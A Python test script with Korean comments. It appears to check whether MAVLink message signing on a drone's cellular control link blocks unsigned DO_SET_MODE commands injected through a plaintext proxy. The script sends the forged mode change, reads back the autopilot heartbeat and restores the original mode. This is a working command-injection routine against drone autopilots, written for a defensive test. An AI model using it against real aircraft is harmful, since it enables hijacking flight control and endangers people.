#!/usr/bin/env python3
"""oracle — SGi 평문 오라클(gcs_proxy :14556)로 UNSIGNED DO_SET_MODE (INJECT · D계층).

attacker(키 없음)가 평문 오라클로 command 발신. 서명(signing) ON 이면 uav_proxy 가 무서명
명령을 폐기 → 자동조종 mode 불변. 성립여부는 **공격자-관측**(같은 14556 에서 autopilot
HEARTBEAT.custom_mode read-back)으로만 판정. 서명강제가 셀룰러 C2 경로를 지키는지 시험(§9-B).

★ 안전: 비행안전 모드만(4/5). autopilot(comp==1, baseline sysid) HEARTBEAT 만 신뢰.
  주입 후 revert 를 **finally 로 보장**(서명강제 하에선 통상 무변화 → no-op, 방어적).

argv: '<ip>:14556 mode <m>' (동적 IP). 출력(stdout, INJECT 계약 · 1줄):
  {"accepted": bool, "signed": false, "blocked_by": "no_effect"|null, "effect": {"mode": "<int>"}}
  blocked_by 는 관측된 무효과만 보고(signing 하드코딩 금지 — 거부사유는 관측 불가).
"""
from __future__ import annotations

import json
import sys
import time

FLIGHT_SAFE = (4, 5)
_EMITTED = False


def log(*a):
    print("[oracle]", *a, file=sys.stderr, flush=True)


def emit(accepted, blocked_by, mode=None):
    global _EMITTED
    if _EMITTED:
        return
    _EMITTED = True
    out = {"accepted": bool(accepted), "signed": False, "blocked_by": blocked_by,
           "effect": ({"mode": str(mode)} if (accepted and mode is not None) else {})}
    sys.stdout.write(json.dumps(out) + "\n"); sys.stdout.flush()


def parse_args(argv):
    toks = []
    for a in argv[1:]:
        toks.extend(str(a).split())
    mode, rest, i = None, [], 0
    while i < len(toks):
        if toks[i] == "mode" and i + 1 < len(toks):
            try:
                mode = int(toks[i + 1])
            except ValueError:
                mode = None
            i += 2
            continue
        rest.append(toks[i]); i += 1
    return (rest[0] if rest else None), mode


def conn_str(ep):
    if not ep:
        return None
    s = ep if ep.split(":", 1)[0] in ("tcp", "udp", "udpin", "udpout") else "udpout:" + ep
    sch, rest = s.split(":", 1)
    if ":" not in rest:
        rest += ":14556"
    return sch + ":" + rest


def read_mode(m, sysid, timeout):
    end = time.time() + timeout
    while time.time() < end:
        msg = m.recv_match(type="HEARTBEAT", blocking=True, timeout=1.0)
        if msg is None:
            continue
        if msg.get_srcComponent() == 1 and (sysid is None or msg.get_srcSystem() == sysid):
            return int(msg.custom_mode), msg.get_srcSystem()
    return None, sysid


def send_mode(m, mode):
    from pymavlink import mavutil
    for _ in range(3):
        m.mav.heartbeat_send(mavutil.mavlink.MAV_TYPE_GCS,
                             mavutil.mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        time.sleep(0.05)
    m.mav.command_long_send(1, 1, mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
                            mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                            mode, 0, 0, 0, 0, 0)


def main() -> int:
    endpoint, mode = parse_args(sys.argv)
    conn = conn_str(endpoint)
    if conn is None or mode is None or mode not in FLIGHT_SAFE:
        log(f"target/mode 무효(mode={mode}, 허용 {FLIGHT_SAFE})"); emit(False, "no_effect"); return 2
    try:
        from pymavlink import mavutil  # noqa: F401
    except Exception as e:
        log("pymavlink import 실패:", type(e).__name__); emit(False, "no_effect"); return 1

    m = None
    injected = False
    baseline = None
    sysid = None
    try:
        log(f"평문 오라클 {conn} UNSIGNED DO_SET_MODE={mode}")
        m = mavutil.mavlink_connection(conn, source_system=255, source_component=190)
        baseline, sysid = read_mode(m, None, 6.0)   # 평문 오라클은 telemetry fan-out → 관측 가능
        log(f"baseline custom_mode={baseline} sysid={sysid}")
        injected = True
        send_mode(m, mode)
        observed = baseline
        end = time.time() + 6
        while time.time() < end:
            cur, sysid = read_mode(m, sysid, 1.5)
            if cur is not None:
                observed = cur
                if cur == mode:
                    break
        accepted = (observed is not None and observed == mode)
        log(f"readback custom_mode={observed} accepted={accepted}")
        emit(accepted, None if accepted else "no_effect", mode if accepted else None)
        return 0
    except Exception as e:
        log("예외:", type(e).__name__); emit(False, "no_effect"); return 1
    finally:
        try:
            if m is not None and injected and baseline in FLIGHT_SAFE and baseline != mode:
                send_mode(m, baseline)
                read_mode(m, sysid, 6.0)
        except Exception:
            pass
        if m is not None:
            try:
                m.close()
            except Exception:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
